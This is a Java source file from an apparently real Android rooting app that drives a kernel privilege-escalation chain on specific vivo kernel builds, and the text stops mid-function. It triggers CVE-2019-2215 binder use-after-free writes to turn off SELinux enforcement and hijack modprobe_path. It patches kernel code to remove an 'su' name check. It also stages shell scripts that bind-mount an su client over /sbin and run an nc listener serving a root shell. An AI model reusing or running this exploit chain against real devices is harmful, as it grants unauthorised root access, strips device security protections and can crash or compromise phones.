package com.xplay6.temproot;

/* The manager app's side of the design: escalate, then act as the authorization
 * authority -- a KernelSU-shaped allow list over a channel that authenticates the
 * caller by kernel bookkeeping.
 *
 * Order is deliberate:
 *   state  -> what the kernel says about us right now (uid, enforce, modprobe)
 *   probe  -> user-memory positive control; proves binder+pipe+readv work in the
 *             untrusted_app domain WITHOUT touching a kernel byte.  A diagnostic,
 *             not a gate: 8 rounds can miss while the real write hits on round 0.
 *   stage  -> copy the bundled daemon into our own files/ dir
 *   run    -> write selinux_enforcing=0, write modprobe_path=<our daemon>,
 *             execve a bad-magic file so the kernel runs it as uid 0
 *   self   -> put our own uid in the allow list, because without it we could not
 *             ask the daemon anything at all
 *   proof  -> ask the daemon for `id`, which is the first request that has to be
 *             authorized by the list we just wrote
 *
 * There is deliberately no `su` anywhere on any PATH and no socket path in the
 * filesystem: an unlisted app has nothing to find and nothing to ask.
 */
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public final class Chain {

    public interface Log {
        void line(String s);
    }

    public static final String GRANTS_NAME = "grants.txt";
    private static final int SU_PORT = 12346;
    private static final int SH_PORT = 12345;

    public static void run(Context ctx, Log log, int rounds) {
        try {
            log.line("state before: " + Esc.nativeState());

            /* Route first: the 6.0.1 positive control exercises THAT kernel's constants, so it
             * must not run on the 8.1 primitive (wrong offsets, wrong chunk sizes). */
            String krel = kernelReleaseFor(ctx, log);
            /* Route 8's two writes carry absolute addresses from PD1610_D_8.19.16, whose release
             * is exactly 3.18.71-perf-g8a8c60dd.  Any other 3.18.71 patch must be refused, not
             * handed to route 6 (6.0.1 addresses into an 8.x kernel is a reboot, not a retry). */
            boolean is8 = krel.startsWith("3.18.71-perf-g8a8c60dd");
            boolean is8family = krel.startsWith("3.18.71");
            route8 = is8;
            if (is8family) {
                log.line("selftest skipped on 3.18.71 (the probe belongs to the 6.0.1 primitive)");
            } else {
                String probe = Esc.nativeProbe();
                log.line("selftest (diagnostic only): " + probe);
            }

            /* Route 8's helper is a SCRIPT, not sud: in u:r:kernel:s0 a static libc ELF reports
             * success and does nothing (measured 2026-10-23), while #! scripts and /system/bin
             * binaries run.  The script starts a same-protocol responder on 12346. */
            File sud = is8 ? stagePayload8(ctx, log) : stage(ctx, log, "sud");
            if (sud == null) {
                log.line("ABORT: " + (is8 ? "payload" : "daemon") + " not staged");
                return;
            }
            selfGrant(ctx, log);
            useToken(ctx);
            log.line("token length=" + (currentToken == null ? 0 : currentToken.length())
                    + " file=" + new File(ctx.getFilesDir(), "su.token").getAbsolutePath());

            /* One attempt is not enough at boot: measured once, step1's write missed
             * all its rounds (the freed slab slot got snatched by other kernel
             * activity), the device stayed Enforcing, and nothing retried.  Each
             * attempt is idempotent -- esc_escalate skips writes that already landed
             * and only re-fires the trigger -- so retrying is cheap and safe. */
            boolean rooted;
            if (is8) {
                /* 8.1: CVE-2019-2215 -> arbitrary kernel write -> permissive + modprobe_path ->
                 * the kernel runs our script.  The script must be staged by us and readable, and
                 * it must be a #! file (see stagePayload8). */
                log.line("kernel " + krel + " -> route 8 (CVE-2019-2215 kernel write, shell payload)");
                rooted = tryEscalate8(sud.getAbsolutePath(), rounds, log);
            } else if (is8family) {
                /* A 3.18.71 patch whose build tag is not the one route 8's addresses were read
                 * from.  Falling through to route 6 would write 6.0.1 addresses into an 8.x
                 * kernel, so refuse loudly instead. */
                log.line("kernel '" + krel + "' is 3.18.71 but not 3.18.71-perf-g8a8c60dd -- route 8's "
                        + "addresses are that build's only; REFUSING to write, nothing was attempted");
                rooted = false;
            } else if (krel.startsWith("3.18.31")) {
                /* 7.1.1 ships a different mechanism: the usermodehelper path this app uses on 6.0.1 is
                 * blocked there, so a staged helper escalates itself in-process and starts the daemon.
                 * art/ledger-20261016.md 512-528 is the measurement trail. */
                log.line("kernel " + krel + " -> route 7 (self-contained helper, permissive-map exemption)");
                /* One attempt per invocation on 7: every attempt fires the binder-UAF needle, and the
                 * needle's own leak rounds carry a measured crash rate (art/ledger-20261016.md 538:
                 * 2 of 10 launches rebooted the phone from inside the leak loop).  Retrying in the
                 * same boot would spend the same luck twice, so the app says so instead. */
                rooted = tryEscalate7(ctx, sud.getAbsolutePath(), rounds, log, 1);
            } else if (krel.startsWith("3.18.")) {
                /* Every ROM of this phone is 3.18.x and the one we must not confuse it with (3.18.31) was
                 * taken by the branch above, so this is the 6.0.1 usermodehelper route. */
                log.line("kernel " + krel + " -> route 6 (modprobe_path / usermodehelper)");
                rooted = tryEscalate(sud.getAbsolutePath(), rounds, 1, log, 6);
                if (!rooted) {
                    log.line("map-only left us unrooted; falling back to the globally-permissive shape");
                    rooted = tryEscalate(sud.getAbsolutePath(), rounds, 0, log, 6);
                }
            } else {
                /* Not a kernel either route knows.  The constants of both are written against a specific
                 * build, so a write here aims at addresses nothing owns -- refuse and say so rather than
                 * guess.  This is the branch a corrupted `os.version` lands in, and corrupting it is
                 * something WE do (see kernelReleaseFor). */
                log.line("kernel '" + krel + "' is neither 8 (3.18.71*), 7 (3.18.31*) nor a known "
                        + "3.18.x -- REFUSING to write, nothing was attempted");
                rooted = false;
            }
            log.line("state after: " + Esc.nativeState());
            if (!rooted)
                log.line("NOT ROOTED after both routes -- see the escalate lines above");
            if (rooted)
                BootJob.markEscalated(ctx);
            if (rooted && krel.startsWith("3.18.31"))
                applyGainChoice(ctx, log);
            if (rooted && is8)
                openSuName8(ctx, log);
            else if (rooted && krel.startsWith("3.18.31"))
                openSuName7(ctx, log);
            else if (rooted)
                openSuName(ctx, log, rounds);
            if (rooted)
                startRelay(ctx, log);
            if (rooted && mapPlanted)
                restoreEnforcing(log);
            else if (rooted && is8)
                log.line("route 8 needs the GLOBAL permissive flip (selinux_enforcing=0); this build "
                        + "has no permissive_map exemption, so enforcing stays off until reboot");
            else if (rooted)
                log.line(krel.startsWith("3.18.31")
                        ? "route 7 owns its own enforcing flip (broot7 does it after the daemon is up); "
                          + "Java's mapPlanted flag only tracks route 6's JNI plant"
                        : "permissive map never planted this boot -> staying globally permissive "
                          + "(flipping enforcing back would confine our own daemon)");
        } catch (Throwable t) {
            log.line("FAILED: " + t);
        }
    }

    /** The globally-permissive fallback reaches root, but it costs the one property this
     *  delivery is judged on: with enforcing off, every domain on the machine is unconfined.
     *  When a map-only attempt of this same boot DID plant policydb.permissive_map and only
     *  lost on a later step, the exemption our domains need is already in place -- so writing
     *  selinux_enforcing back to 1 puts the machine into the shipped (map-only) shape.
     *  Measured 2026-10-15: after such a fallback boot, `echo 1 > /sys/fs/selinux/enforce` from
     *  the daemon left getenforce=Enforcing and `su -c id -u` still answering 0.
     *  The flip is witnessed, and the witness goes through the very channel at risk: if it
     *  stops answering, root is gone and `adb reboot` is the undo -- as it is for everything
     *  else in this design. */
    private static void restoreEnforcing(Log log) {
        String now = trim1(root("getenforce"));
        if (!now.contains("Permissive")) {
            log.line("enforcing restore: not needed, " + now);
            return;
        }
        log.line("enforcing restore: permissive map is planted, flipping the global flag back");
        log.line("  wrote: " + trim1(root("sh -c 'echo 1 > /sys/fs/selinux/enforce; cat /sys/fs/selinux/enforce'")));
        String back = root("id -u; getenforce");
        log.line("  witness (uid+enforce via the su channel): " + trim1(back));
        if (!back.startsWith("0")) {
            log.line("  ★ su channel did not survive the flip, trying to hand enforcing back: "
                    + trim1(root("sh -c 'echo 0 > /sys/fs/selinux/enforce'")));
            log.line("  ★ if that was refused too the machine is confined -- undo = adb reboot");
        }
    }

    private static String kernelRelease() {
        String s = System.getProperty("os.version");
        return s == null ? "" : s.trim();
    }

    /** Route selection has to survive a SECOND run in the same boot.  `os.version` comes from uname(),
     *  and the 7 route plants its ebitmap nodes inside `init_uts_ns` -- measured 2026-10-19 after a
     *  successful run: `uname -a` reads "Linu@<bytes>  aarch64" and /proc/sys/kernel/{ostype,osrelease,
     *  version} come back with the same garbage.  The live reading is therefore unusable after we ran,
     *  and an empty os.version used to fall through to the ELSE branch -- route 6 -- whose constants are
     *  the 6.0.1 kernel's addresses: writing 6.0.1 targets into 3.18.31 is a reboot, not a retry.
     *  So remember the release the first time a plausible one is seen, fall back to that memory, and if
     *  there is no memory either, refuse instead of guessing. */
    private static String kernelReleaseFor(Context ctx, Log log) {
        String now = kernelRelease();
        android.content.SharedPreferences p = ctx.getSharedPreferences("temproot", 0);
        if (now.startsWith("3.18.31") || now.startsWith("3.18.71") || now.startsWith("3.18.20")) {
            p.edit().putString("krel", now).apply();
            return now;
        }
        String mem = p.getString("krel", "");
        if (mem != null && !mem.isEmpty() && !mem.equals(now))
            log.line("os.version now reads '" + now + "' (our own map host overwrote init_uts_ns)"
                    + " -- routing on the remembered '" + mem + "'");
        return mem == null ? "" : mem;
    }

    /** The 7.1.1 route.  The helper finds its own task_struct, borrows init_cred to get an arbitrary
     *  READ, plants the SELinux permissive-map exemption, then edits its OWN credential in place and
     *  starts `daemon` as root.  Every write is re-verified by reading the cell back, and retrying is
     *  safe because the helper derives its targets from live memory rather than assuming constants. */
    private static boolean tryEscalate7(Context ctx, String daemon, int rounds, Log log, int tries) {
        File h = stage(ctx, log, "broot7");
        if (h == null) {
            log.line("ABORT: broot7 was not staged");
            return false;
        }
        /* argv[1] for broot7 is the number of NEEDLE rounds, and agreement on this ROM took 8-13
         * rounds measured (runs 48-59).  The value the UI carries was written for the 6.0.1 route,
         * where it meant something else, so it is clamped here rather than passed through. */
        int nrounds = rounds < 12 ? 12 : (rounds > 24 ? 24 : rounds);
        for (int attempt = 1; attempt <= tries; attempt++) {
            try {
                ProcessBuilder pb = new ProcessBuilder(h.getAbsolutePath(), String.valueOf(nrounds));
                pb.redirectErrorStream(true);
                /* Log to a file as well as the pipe: the app-side diagnosis of run 67 came from the
                 * HEAD of the captured output only (trim1), and the L7:/P7: lines that say which step
                 * stopped are at the END of a several-hundred-line run. */
                /* The external files dir is the one place adb can watch WHILE the ladder runs: on
                 * this boot the app never reached its own copy step (two reboots, zero `attempt`
                 * lines, yet the device really went permissive), so a log that only becomes readable
                 * after the app survives tells us nothing. (art/ledger-20261016.md 614) */
                java.io.File extDir = ctx.getExternalFilesDir(null);
                java.io.File blog = new java.io.File(
                        extDir != null ? extDir : ctx.getFilesDir(), "broot7.log");
                pb.redirectOutput(blog);
                pb.environment().put("LADDER7", "1");
                pb.environment().put("DAEMON7", daemon);
                pb.environment().put("HOLD", "20");
                pb.environment().put("SIG", "1");
                pb.environment().put("SPAN", "0x400000");
                pb.environment().put("BPFDS", "14");
                /* WRITER7 must be this staged copy: broot7 forks+execve's a supervisor and a dancer
                 * per write, and the compiled-in default is /data/local/tmp/broot7, which only exists
                 * on the adb route.  Without it the ladder aborts with "no supervisor". */
                pb.environment().put("WRITER7", h.getAbsolutePath());
                pb.environment().put("ENFORCE7", "1");
                /* Backlate: do the privileged setup (listeners, the /sbin overlay, setcon) inside the
                 * permissive window, then flip enforcing back.  Measured reason (art/ledger-20261016.md
                 * 548-550): this kernel honours permissive_map for the capability/process classes but
                 * NOT for inode/dir, so mkdir/bind/mount must happen before the flip -- with the
                 * strict order the daemon could not set itself up and the post-flip borrow failed. */
                pb.environment().put("BACKLATE7", "1");
                /* INPROC7 was tried and dropped: in-process writes do land while this task holds its
                 * own credential, but the first write issued AFTER the credential is borrowed kills the
                 * process (run 51 on the adb route, and the app run whose log stops at exactly that
                 * write).  The standing writer -- exec'd once before the borrow, never again -- is the
                 * shape that keeps every write in an unborrowed process.  See ledger 555/556. */
                pb.environment().put("PERROUND", "4");
                pb.environment().put("NICE", "7");
                log.line("ladder attempt " + attempt + ": exec " + h.getAbsolutePath()
                        + " rounds=" + nrounds + " log=" + blog.getAbsolutePath());
                Process pr = pb.start();
                java.io.InputStream in = pr.getInputStream();
                byte[] buf = new byte[8192];
                StringBuilder sb = new StringBuilder();
                int n;
                while ((n = in.read(buf)) > 0) {
                    sb.append(new String(buf, 0, n));
                    if (sb.length() > 60000)
                        break;
                }
                pr.waitFor();
                log.line("broot7 attempt " + attempt + " rc=" + pr.exitValue() + ": " + trim1(sb.toString()));
                log.line("broot7 steps: " + stepsOfFile(blog, 1600));
                /* Also drop the raw log where adb can read it without root: on this ROM the app's own
                 * external files dir is reachable through sdcardfs, so one escalation run gives the
                 * full read-out instead of the filtered 1600 chars. */
                java.io.File ext = ctx.getExternalFilesDir(null);
                java.io.File xdst = ext == null ? null : new java.io.File(ext, "broot7.log");
                /* Since 1.9.3 the ladder already writes straight into the external dir, so this copy
                 * is a copy onto ITSELF: opening the destination with FileOutputStream truncates it
                 * first, and the one escalation log that was verified to come up (84 915 bytes) was
                 * then zeroed by its own copy step -- which is why criterion A1 read "log is new, no
                 * root line" (art/ledger-20261016.md 620, 628). Same path means nothing to copy. */
                if (xdst != null && !xdst.getAbsolutePath().equals(blog.getAbsolutePath())) {
                    try {
                        java.io.FileInputStream fi = new java.io.FileInputStream(blog);
                        java.io.FileOutputStream fo = new java.io.FileOutputStream(
                                new java.io.File(ext, "broot7.log"));
                        try {
                            byte[] cb = new byte[8192];
                            int cn;
                            while ((cn = fi.read(cb)) > 0)
                                fo.write(cb, 0, cn);
                        } finally {
                            fi.close();
                            fo.close();
                        }
                        log.line("broot7.log copied to " + new java.io.File(ext, "broot7.log").getAbsolutePath());
                    } catch (Throwable t) {
                        log.line("copy failed: " + t);
                    }
                }
            } catch (Throwable e) {
                log.line("broot7 attempt " + attempt + " threw " + e);
            }
            String who = root("id; getenforce; grep -m1 CapEff /proc/self/status");
            log.line("  root probe [" + lastChannel + "]: " + who);
            if (who.startsWith("uid=0"))
                return true;
            try {
                Thread.sleep(2500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return false;
    }

    /** One escalation shape, retried until the su channel answers as root.
     *  mapOnly=1 keeps Enforcing up (only our types are exempt); mapOnly=0 is the older route.
     *  Each native call is idempotent -- esc_escalate_ex skips writes that already landed and
     *  only re-fires the trigger -- so retrying is cheap and safe. */
    private static boolean tryEscalate(String daemon, int rounds, int mapOnly, Log log, int tries) {
        for (int attempt = 1; attempt <= tries; attempt++) {
            String r = Esc.nativeEscalate(daemon, rounds, mapOnly);
            if (r.indexOf("step1 map rc=0") >= 0)
                mapPlanted = true;
            log.line("escalate(mapOnly=" + mapOnly + ") attempt " + attempt + ": " + r);
            String who = root("id; getenforce; grep -m1 CapEff /proc/self/status");
            log.line("  root probe [" + lastChannel + "]: " + who);
            if (who.startsWith("uid=0"))
                return true;
            try {
                Thread.sleep(2500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return false;
    }

    /** Route 8: two kernel writes, then one trigger.  `rounds` is the number of primitive shots
     *  per write (esc_escalate8 clamps it to 1..4); the caller's probe decides success. */
    private static boolean tryEscalate8(String payload, int rounds, Log log) {
        int tries = rounds < 1 ? 2 : (rounds > 4 ? 4 : rounds);
        for (int attempt = 1; attempt <= 2; attempt++) {
            String r = Esc.nativeEscalate8(payload, tries);
            log.line("escalate8 attempt " + attempt + ": " + r);
            String who = root("id; getenforce; grep -m1 CapEff /proc/self/status");
            log.line("  root probe [" + lastChannel + "]: " + who);
            if (who.startsWith("uid=0"))
                return true;
            try {
                Thread.sleep(2500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
        }
        return false;
    }

    /** Route 8 stages TWO #! scripts.  `sud8` is what modprobe_path points at (the kernel helper
     *  execs it in u:r:kernel:s0); `sud8srv` is what toybox nc runs per connection.  Both are
     *  scripts because that domain silently discards everything a static libc ELF does -- and the
     *  responder must be a script anyway, since it has to stay alive after `sud8` exits and be
     *  restarted only by a fresh trigger.  Paths are absolute: the helper gets no useful env. */
    private static File stagePayload8(Context ctx, Log log) {
        final String B = "/data/data/com.xplay6.temproot/files";
        File srv = new File(ctx.getFilesDir(), "sud8srv");
        File pay = new File(ctx.getFilesDir(), "sud8");

        String responder =
                "#!/system/bin/sh\n"
              + "PATH=/system/bin:/system/xbin:/sbin\n"
              /* libshizuku starter 会 exec app_process；缺 ANDROID_DATA 时 libjavacore 直接
               * SIGABRT（"ANDROID_DATA environment variable not set"）。 */
              + "export ANDROID_ROOT=/system ANDROID_ASSETS=/system/app ANDROID_DATA=/data "
              + "ANDROID_STORAGE=/storage\n"
              + "export EXTERNAL_STORAGE=/sdcard ASEC_MOUNTPOINT=/mnt/asec DOWNLOAD_CACHE=/data/cache\n"
              + "B=" + B + "\n"
              + "LOG=/data/local/tmp/.sud/sud.log\n"
              + "IFS= read -r line || exit 0\n"
              + "line=$(printf '%s' \"$line\" | /system/bin/toybox tr -d '\\r')\n"
              + "case \"$line\" in\n"
              + "  *\" TOK=\"*) tok=${line##* TOK=} ;;\n"
              + "  *) echo 'REFUSED no token'; exit 0 ;;\n"
              + "esac\n"
              + "line=${line% TOK=*}\n"
              + "want=$(/system/bin/toybox head -c 96 \"$B/su.token\" 2>/dev/null "
              + "| /system/bin/toybox tr -d '\\r\\n ')\n"
              + "[ -n \"$tok\" ] && [ \"$tok\" = \"$want\" ] || { echo 'REFUSED token'; exit 0; }\n"
              + "case \"$line\" in\n"
              + "  SU\\ *) rest=${line#SU } ;;\n"
              + "  *) echo 'REFUSED unsupported'; exit 0 ;;\n"
              + "esac\n"
              + "uid=${rest%% *}\n"
              + "if [ \"$uid\" = \"$rest\" ]; then cmd=; else cmd=${rest#* }; fi\n"
              + "[ \"$uid\" = 0 ] || { echo 'REFUSED uid'; exit 0; }\n"
              + "mkdir -p /data/local/tmp/.sud 2>/dev/null\n"
              + "printf '%s SU 0 %s\\n' \"$(/system/bin/toybox date +%H:%M:%S)\" \"$cmd\" "
              + ">> \"$LOG\" 2>/dev/null\n"
              /* Same rule as sud's decision record: root-only, so no app can read which
               * commands other apps ran.  suLog() reaches it through the token channel. */
              + "chmod 0600 \"$LOG\" 2>/dev/null\n"
              /* Shizuku 走交互式 root shell（`SU 0 -`，命令全在 stdin），所以整个交互
               * shell 必须直接落在 u:r:shell:s0：uid 仍 0，但 /data ELF 可执行、
               * binder/系统服务可用（kernel 域 service find 被 servicemanager 拒绝）。 */
              + "if [ \"$cmd\" = \"-\" ]; then exec runcon u:r:shell:s0 /system/bin/sh; fi\n"
              /* 非交互 `SU 0 <cmd>` 同理：kernel 域下 pm/am/appops 一律
               * "Could not access the Package Manager"（servicemanager 的用户态 MAC 检查
               * 不受全局 permissive 影响），shell 域 + permissive 才是完整的 root。 */
              + "runcon u:r:shell:s0 /system/bin/sh -c \"$cmd\"\n"
              + "rc=$?\n"
              + "printf '\\n@SUD_EXIT=%d\\n' \"$rc\"\n";

        String payload =
                "#!/system/bin/sh\n"
              + "PATH=/system/bin:/system/xbin:/sbin\n"
              + "B=" + B + "\n"
              + "mkdir -p /data/local/tmp/.sud 2>/dev/null\n"
              + "chmod 0711 /data/local/tmp/.sud 2>/dev/null\n"
              + "setsid /system/bin/toybox nc -L -p " + SU_PORT
              + " /system/bin/sh \"$B/sud8srv\" >/dev/null 2>&1 &\n"
              /* relayd 由 root 侧看门狗拉起、setsid 后 ppid=1，与 nc handler 同寿命：vivo RMS
               * 杀掉 app 进程（后台服务，cached 随手杀）不再殃及 su 通道。app 活着时它自己的
               * startRelay 先占住 @sud（untrusted_app 域），看门狗 pidof 检测到就不重复拉；
               * app 一死 relayd 随死，看门狗 10s 内补位。relayd 必须 bind abstract @sud，
               * kernel 域绑不了 AF_UNIX，所以 runcon 到 u:r:shell:s0（uid 仍 0，可读 0600 的
               * grants/token，可 exec /data ELF）。--serve-if-free 兜底 stand down。 */
              + "( while true; do\n"
              + "  if ! pidof relayd >/dev/null 2>&1; then\n"
              + "    runcon u:r:shell:s0 /system/bin/toybox setsid \"$B/relayd\""
              + " --serve-if-free --sock sud --grants \"$B/grants.txt\""
              + " --token \"$B/su.token\" --log /data/local/tmp/.sud/relayd.log >/dev/null 2>&1\n"
              + "  fi\n"
              + "  sleep 10\n"
              + "done ) >/dev/null 2>&1 &\n"
              + "exit 0\n";

        if (!writeScript(log, srv, responder) || !writeScript(log, pay, payload))
            return null;
        log.line("route 8 payload ready: " + pay.getAbsolutePath()
                + " (modprobe_path target; responder " + srv.getAbsolutePath() + ")");
        return pay;
    }

    /** Write a staged script the way stage() writes a binary: unique temp name, then rename,
     *  so a responder still running from the old inode is never truncated in place. */
    private static boolean writeScript(Log log, File f, String body) {
        File tmp = new File(f.getParentFile(), f.getName() + ".new." + System.currentTimeMillis());
        try {
            OutputStream o = new FileOutputStream(tmp);
            o.write(body.getBytes("UTF-8"));
            o.close();
            tmp.setExecutable(true, false);
            tmp.setReadable(true, false);
            File real = f;
            if (!tmp.renameTo(f)) {
                log.line("rename " + tmp.getName() + " -> " + f.getName() + " failed, using temp path");
                real = tmp;
            }
            real.setExecutable(true, false);
            real.setReadable(true, false);
            log.line("staged " + real.getAbsolutePath() + " bytes=" + real.length()
                    + " canExec=" + real.canExecute());
            return true;
        } catch (Throwable t) {
            log.line("write " + f.getName() + " failed: " + t);
            return false;
        }
    }

    /** Put a client on PATH the way sud's MOUNT does, but from a shell, because route 8 has no
     *  daemon that can do it: /sbin is read-only rootfs, so every entry is bind-mounted into a
     *  mirror under /data, the client is added under both names, and the mirror is bound over
     *  /sbin.  The kernel helper runs in PID 1's mount namespace, which is the one apps see
     *  (route 7 needed setns only because its daemon was the isolated one).
     *  Name gate: esc8's step 2 patches the 8.1 checker (0xffffffc0001cb3cc -> `mov w0,#0;
     *  ret`), so the literal name `su` and `sux` are both delivered here and both work --
     *  measured as uid 2000: a real file named `su` returns 42 after the patch.  On a boot
     *  where some su exec already happened before the patch the I-cache keeps the old code,
     *  so `sux` remains a fallback.  Nothing is written to a partition. */
    private static void openSuName8(Context ctx, Log log) {
        File su = stage(ctx, log, "su");
        if (su == null) {
            log.line("  sux on PATH skipped: client not staged");
            return;
        }
        File m = new File(ctx.getFilesDir(), "mirror8.sh");
        String script =
                "#!/system/bin/sh\n"
              + "PATH=/system/bin:/system/xbin:/sbin\n"
              + "T=/system/bin/toybox\n"
              + "R=/data/local/tmp/.sur8\n"
              /* A second chain run in the same boot must not build a mirror from the mirror: the
               * marker is only reachable through OUR bind, so its presence means /sbin already is
               * this mirror. */
              + "[ -f /sbin/.r8mirror ] && { echo 'MIRROR8 already active'; exit 0; }\n"
              + "rm -rf \"$R\"; mkdir -p \"$R\" || exit 1\n"
              + "for f in /sbin/*; do\n"
              + "  [ -e \"$f\" ] || continue\n"
              + "  n=${f##*/}\n"
              /* Never inherit a `su`/`sux` from whatever currently sits on /sbin: those names are
               * exactly what we deliver, and an older placeholder would shadow our client. */
              + "  case \"$n\" in su|sux) continue;; esac\n"
              + "  if [ -d \"$f\" ]; then\n"
              + "    mkdir -p \"$R/$n\"; $T mount --bind \"$f\" \"$R/$n\" 2>/dev/null; continue\n"
              + "  fi\n"
              + "  : > \"$R/$n\" || continue\n"
              + "  $T mount --bind \"$f\" \"$R/$n\" 2>/dev/null "
              + "|| { rm -f \"$R/$n\"; cp -p \"$f\" \"$R/$n\" 2>/dev/null; }\n"
              + "done\n"
              + ": > \"$R/.r8mirror\"\n"
              + "cp \"" + su.getAbsolutePath() + "\" \"$R/su\" || exit 1\n"
              + "cp \"" + su.getAbsolutePath() + "\" \"$R/sux\" || exit 1\n"
              + "chmod 0755 \"$R/su\" \"$R/sux\"\n"
              + "$T mount --bind \"$R\" /sbin || exit 1\n"
              + "echo MIRROR8 ok\n"
              + "ls -l /sbin/su /sbin/sux 2>&1\n";
        if (!writeScript(log, m, script))
            return;
        log.line("  mirror /sbin: " + trim1(root("sh " + m.getAbsolutePath())));
        log.line("  PATH witness: " + trim1(root(
                "sh -c 'command -v sux; command -v su; ls -l /sbin/sux 2>&1 | tail -1'")));
        log.line("  note: esc8 patched the name gate, so granted apps can call `su` (sux kept "
                + "as fallback for boots where `su` ran before the patch)");
    }

    /** Does vivo's exec guard on the *name* `su` also bite an app-domain caller?
     *  Measured already: uid 2000 gets "Operation not permitted" on
     *  /data/local/tmp/su while the identical bytes named sux/mysu/.su run fine,
     *  and uid 0 runs either.  This checks the two cases that decide whether a
     *  granted third-party app could ever use a su we hand it: (a) the app exec'ing
     *  a file named su inside its own private dir, (b) the same exec as root.
     *  The file is a copy of our own client, so a successful exec proves nothing
     *  about privileges -- only that the exec was allowed. */
    public static void suNameProbe(Context ctx, Log log) {
        File f = stage(ctx, log, "su");
        if (f == null)
            return;
        /* Same bytes, two names, both inside our own data dir.  Without the second
         * row the first is uninterpretable: "an app cannot exec files/su" could mean
         * the NAME is guarded, or that an app cannot exec from its own data dir at
         * all -- two different obstacles with two different fixes. */
        try {
            InputStream in = new java.io.FileInputStream(f);
            byte[] buf = new byte[(int) f.length()];
            int off = 0, n;
            while (off < buf.length && (n = in.read(buf, off, buf.length - off)) > 0)
                off += n;
            in.close();
            File alt = new File(ctx.getFilesDir(), "sux");
            OutputStream o = new FileOutputStream(alt);
            o.write(buf, 0, off);
            o.close();
            alt.setExecutable(true, false);
        } catch (Throwable t) {
            log.line("copy to sux failed: " + t);
        }
        tryExec(ctx, log, "su");
        tryExec(ctx, log, "sux");
        log.line("root-exec su: " + root("/data/data/com.xplay6.temproot/files/su --help"));
    }

    private static void tryExec(Context ctx, Log log, String name) {
        String p = "/data/data/com.xplay6.temproot/files/" + name;
        try {
            Process pr = Runtime.getRuntime().exec(new String[] { p, "--help" });
            String out = slurp(pr.getInputStream(), 300);
            String err = slurp(pr.getErrorStream(), 300);
            int rc = pr.waitFor();
            log.line("app-exec " + name + ": rc=" + rc + " out=" + out.trim()
                    + (err.length() > 0 ? " err=" + err.trim() : ""));
        } catch (Throwable t) {
            log.line("app-exec " + name + ": REFUSED " + t.getClass().getSimpleName()
                    + ": " + t.getMessage());
        }
    }

    /** Two RAM writes that make a bare `su` usable by any app, plus the mirror that puts it
     *  on PATH.  Order and witnesses matter:
     *    - the name gate exempts any uid 0, so the patch must be witnessed by an
     *      **app-domain** execve of a file literally named su -- a root call would pass even
     *      with the gate intact and prove nothing;
     *    - if that witness fails, the instruction word goes straight back (a half-patched
     *      kernel is worse than an unpatched one);
     *    - MOUNT is root-only in sud by design (it changes what every app sees), so it is
     *      issued through the daemon's root channel, not from this uid.
     *  Everything here is memory-only: a reboot restores the shipped gate and drops /sbin/su. */
    /** Route 7's half of the same goal: put the su CLIENT on PATH where every process can see it.
     *  Two things had to be measured before this could be written (art/ledger-20261016.md 570):
     *  Android 7's zygote gives each app its own mount namespace, so a mount done by our daemon was
     *  invisible to everyone else -- the fix is nsmbind, which joins PID 1's namespace with setns()
     *  before binding.  And the mirror has to live under /data (a fresh file in /dev inherits
     *  u:object_r:device:s0 and no caller can even stat it) with an explicit umask(022)/chmod,
     *  because the daemon runs with umask 077 and the mirror came out 0700.
     *  The literal name `su` used to be refused with EPERM here -- a vendor name check, not SELinux
     *  (no avc line at all, and the same bytes named `sux` executed fine) -- and that gate is now
     *  defeated for it: the instruction that consumes its verdict is 0xffffffc000323400 and
     *  sugate7Witnessed() below NOPs it (art/ledger-20261016.md 664).  `sux` is still delivered, so a
     *  boot where the patch did not land keeps working.  The PATH half writes no kernel address; the
     *  gate half is the only .text write in this route, and it happens last, behind two witnesses. */
    private static void openSuName7(Context ctx, Log log) {
        /* 3.18.31 carries the same guard, at a different address: the verdict branch in
         * do_execveat_common (ledger 664).  Defeat it first, then deliver the names -- with the
         * gate open both `su` and `sux` are reachable from an app domain, which is what Shizuku
         * and other libsu callers need; without it they fall back to `sh` and never ask. */
        String sg = "";
        for (int attempt = 1; attempt <= 4; attempt++) {
            sg = sugate7Witnessed(log);
            log.line("sugate7 attempt " + attempt + ": " + sg);
            if (sg.startsWith("rc=0"))
                break;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
        if (!sg.startsWith("rc=0"))
            log.line("  7 name gate left as shipped; apps must keep calling a renamed client");
        File su = stage(ctx, log, "su");
        File ns = stage(ctx, log, "nsmbind");
        if (su == null || ns == null) {
            log.line("  sux on PATH skipped: stage failed");
            return;
        }
        String out = trim1(root("cp " + su.getAbsolutePath() + " /data/local/tmp/su7x; "
                + "cp " + ns.getAbsolutePath() + " /data/local/tmp/nsmbind7; "
                + "chmod 755 /data/local/tmp/su7x /data/local/tmp/nsmbind7; "
                /* Both names in ONE invocation: nsmbind now binds per name, and a second invocation
                 * used to publish its own mirror over the first and leave `sux` a 0-byte placeholder
                 * (art/ledger-20261016.md 634-635). The name gate admits su/sux/su7x. */
                + "/data/local/tmp/nsmbind7 /data/local/tmp/su7x /sbin su,sux 1"));
        log.line("  nsmbind: " + out);
        log.line("  PATH witness: " + trim1(root("sh -c 'ls -ld /sbin; ls -lZ /sbin/sux | tail -1'")));
        if (sg.startsWith("rc=0") && !execAllowed(su, log)) {
            /* The write reported success but the exec still refuses: the word did not land where
             * we think it did.  Put it back rather than leaving a half-defeated guard in place. */
            log.line("  witness refused after sugate7 -> reverting: " + Esc.nativeSugate7Revert());
        } else if (!sg.startsWith("rc=0")) {
            log.line("  (exec test skipped while the gate is in force: `su` is denied by design)");
        }
    }

    /** 7's gate patch, one step at a time, with the alias window witnessed by a root-channel read
     *  before a single .text byte is written.
     *
     *  Why the read lives here and not in the native code: the witness object is
     *  /proc/sys/kernel/modprobe, and this uid can read it only because the SELinux exemption was
     *  planted seconds earlier in the same run (measured from the app process at boot, ledger 670).
     *  A kernel text patch must not rest on a read whose permission comes from our own earlier write
     *  -- the root channel answers as uid 0 either way, so the witness goes through that.  Rule 653:
     *  no read-back, no write. */
    private static String sugate7Witnessed(Log log) {
